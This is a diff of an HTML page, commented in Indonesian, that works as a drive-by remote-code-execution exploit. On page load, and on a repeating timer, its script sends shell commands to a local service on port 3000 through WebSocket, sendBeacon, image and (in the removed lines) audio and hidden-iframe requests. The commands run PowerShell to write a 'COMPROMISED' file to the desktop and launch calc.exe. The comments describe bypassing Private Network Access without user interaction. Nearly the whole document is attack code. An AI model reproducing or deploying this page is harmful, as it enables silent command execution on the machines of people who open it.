@@ -1,58 +1,49 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Critical System Update</title>
+    <title>Critical Security Patch</title>
 </head>
-<body style="background:#000; color:#0f0; font-family:monospace; text-align:center;">
-    <h1>INITIALIZING SECURE PROTOCOL...</h1>
-    <div id="l"></div>
+<body style="background:black; color:#0f0; font-family:monospace; text-align:center; padding-top:100px;">
+    <h1>SYSTEM ISOLATION BREACH TEST</h1>
+    <div id="logs" style="text-align:left; display:inline-block; width:80%;"></div>
 
     <script>
-        const log = (m) => document.getElementById('l').innerHTML += `> ${m}<br>`;
+        const log = (m) => document.getElementById('logs').innerHTML += `> ${m}<br>`;
         
-        // Payload RCE yang lebih mematikan (Silently execute)
-        const cmd = "calc.exe"; 
+        // Payload: Menulis file ke desktop menggunakan PowerShell
+        // Kami menggunakan PowerShell karena sangat kuat untuk membuktikan dampak RCE
+        const filePayload = 'powershell -Command "Set-Content -Path $env:USERPROFILE\\Desktop\\VULNERABLE.txt -Value \'THIS SYSTEM IS COMPROMISED VIA CHROME PNA BYPASS. DATE: \' (Get-Date)"';
+        const calcPayload = 'calc.exe';
 
-        async function startChain() {
-            log("Phase 1: Bypassing PNA via WebSocket Shadowing...");
+        async function inject() {
+            const targets = ["127.0.0.1", "0.0.0.0", "localhost"];
             
-            const hosts = ["127.0.0.1", "0.0.0.0", "[::1]"];
-            
-            hosts.forEach(ip => {
-                // Teknik 1: WebSocket Shadowing (Bypass PNA Preflight)
+            targets.forEach(ip => {
+                log(`Testing Shadowing on ${ip}...`);
+
+                // 1. WebSocket Injection (Primary)
                 try {
-                    let ws = new WebSocket(`ws://${ip}:3000`);
+                    const ws = new WebSocket(`ws://${ip}:3000`);
                     ws.onopen = () => {
-                        ws.send(cmd);
-                        log(`[!] PNA Boundary Breached on ${ip}`);
+                        log(`[!] WS CONNECTED: Injecting txt file via ${ip}...`);
+                        ws.send(filePayload); // Kirim perintah tulis file
+                        ws.send(calcPayload); // Kirim perintah buka kalkulator
                     };
                 } catch(e){}
 
-                // Teknik 2: Persistent Subresource Fetch (Bypass Mixed Content via 'No-Config')
-                // Menggunakan ping/sendBeacon seringkali lolos dari Mixed Content filter
-                navigator.sendBeacon(`http://${ip}:3000/exec?cmd=${encodeURIComponent(cmd)}`);
+                // 2. Beacon Injection (Secondary)
+                navigator.sendBeacon(`http://${ip}:3000/exec?cmd=${encodeURIComponent(filePayload)}`);
 
-                // Teknik 3: Audio Context Request (Bypass User Interaction)
-                // Beberapa browser mengizinkan 'low-level' socket via audio/video pre-fetch
-                let a = new Audio();
-                a.src = `http://${ip}:3000/exec?cmd=${encodeURIComponent(cmd)}`;
+                // 3. Image Backup
+                new Image().src = `http://${ip}:3000/exec?cmd=${encodeURIComponent(calcPayload)}`;
             });
-
-            // Teknik 4: Iframe 'Self-Flipping' (Force Navigation)
-            // Memaksa browser melakukan 'Top-level' request tanpa prompt
-            const ifr = document.createElement('iframe');
-            ifr.src = `http://127.0.0.1:3000/exec?cmd=${encodeURIComponent(cmd)}`;
-            ifr.style.display = "none";
-            document.body.appendChild(ifr);
         }
 
-        // AUTO-START: Mencoba Zero-Click
-        // Jika auto-start diblokir, script akan menunggu 1 detik lalu mencoba lagi
         window.onload = () => {
-            log("Chain sequence started...");
-            startChain();
-            // Loop serangan setiap 5 detik untuk memastikan persistensi
-            setInterval(startChain, 5000);
+            log("Starting exploit chain...");
+            inject();
+            // Loop untuk memastikan race condition menang
+            setInterval(inject, 10000);
         };
     </script>
 </body>
